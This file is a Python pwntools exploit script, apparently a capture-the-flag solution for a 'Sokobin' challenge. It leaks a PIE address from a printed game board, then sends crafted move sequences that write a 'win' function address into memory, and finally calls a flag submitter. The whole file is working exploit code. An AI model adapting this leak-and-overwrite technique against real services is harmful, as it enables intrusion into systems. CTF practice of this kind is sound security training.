#!/usr/bin/env python3

from pwn import *

#!/usr/bin/env python3

from pwn import *


import time

def conn():
    HOST = os.environ.get('HOST', 'localhost')
    PORT = 31337

    io = remote(HOST, int(PORT))
    return io



def main():
  global tab
  io=conn()
  
  tab=[[0 for i in range(32)] for j in range(32)]
  def readtable():
    global tab
    io.recvuntil(b"Sokobin!")
    io.recvline()
    arr=[]
    for i in range(32):
      line=io.recvline()
      #  print(line)
      tot=0
      for j in range(32):
        tab[i][j]=0
        if line[j]!=ord('.'):
          tab[i][j]=int(line[j]!=ord('.'))
          tot+=(1<<j)
      
      arr.append(tot)
    return arr
  
 
  
  arr=readtable()
  
  #  print([hex(a) for a in arr])
  pieleak=arr[-20]*pow(2,32)+arr[-19]
  #  print(hex(pieleak))
  
  win=pieleak+0x5769de071250-0x5769de071274
  
  #  print(hex(win))
  pay=b"s"*23+b"ws"+b"s"*31+b"w"*4
  pay+=b"w"*8
  pay+=(b"wra"*32+b"s"*32+b"w")*5
  pay+=b"r"*13+b"a"*32+b"w"*13+b"r"*13

  pay+=b"s"*32
  pay+=(b"wra"*32+b"s"*32+b"w")*5
  
  io.sendline(pay)
  
  readtable()
  
  
  
  def getNms():
    Nms=[]
    for i in range(15,19):
      #  print(tab[i])
      T=0
      for j in range(32):
        T+=tab[i][j]
      Nms.append(T)
    Nms=Nms[::-1]
    return Nms
  
  Nms=getNms()
  #  print(Nms)
  pay2=b""
  for i in range(4):
    pay2+=b"w"
    pay2+=b"a"*(30-Nms[i])+b"s"*(30-Nms[i])
  
  pay2+=b"w"+b"a"*32+b"r"+b"rrr"
  io.sendline(pay2)
  
  target1=win%pow(2,32)
  
  Bts=[]
  for bit in range(32):
    if (target1>>bit)&1:
      Bts.append(bit)
  #  print(Bts)
  #  Bts=[4,5]
  
  Cur=0
  Pay3=b""
  while Cur<4 and len(Bts)>0:
    Pay3+=b"s"*(30-Nms[Cur])+b"a"*32
    while Nms[Cur]>0 and len(Bts)>0:
      Pay3+=b"w"*(4-Cur)+b"s"*30+b"r"*5
      #  print("X",Bts[0])
      if Bts[0]<=30:
        Nms[Cur]-=1
        Pay3+=b"sr"+b"a"*(30-Bts[0])+b"warw"+b"a"*32+b"w"*(1+Cur)+b"s"*(30-Nms[Cur])+b"a"*(30-Nms[Cur])
        Bts=Bts[1:]
        
      else:
        Nms[Cur]-=1
        Pay3+=b"arswsr"+b"a"*32+b"w"*(2+Cur)+b"s"*(30-Nms[Cur])+b"a"*(30-Nms[Cur])
        
        Bts=Bts[1:]

    if Nms[Cur]==0:
      Pay3+=b"w"
      Cur+=1
    
    
  io.sendline(Pay3)
  
  target2=win>>32
  
  Bts=[]
  for bit in range(32):
    if (target2>>bit)&1:
      Bts.append(bit)
  #  print(Bts)
  Pay3=b""
  #  print("CYC 2")
  while Cur<4 and len(Bts)>0:
    #  print(len(Bts),Nms[Cur])
    Pay3+=b"s"*(30-Nms[Cur])+b"a"*32
    while Nms[Cur]>0 and len(Bts)>0:
      Pay3+=b"w"*(4-Cur)+b"s"*30+b"r"*5
      #  print(Bts[0])
      Nms[Cur]-=1
      Pay3+=b"sr"+b"a"*(30-Bts[0])+b"w"+b"a"*32+b"w"*(1+Cur)+b"s"*(30-Nms[Cur])+b"a"*(30-Nms[Cur])
      Bts=Bts[1:]

    if Nms[Cur]==0:
      Pay3+=b"w"
      Cur+=1
  
  io.sendline(Pay3+b"q")
  
  io.sendline(b"./submitter")
  print(io.clean(1))


if __name__ == "__main__":
    main()



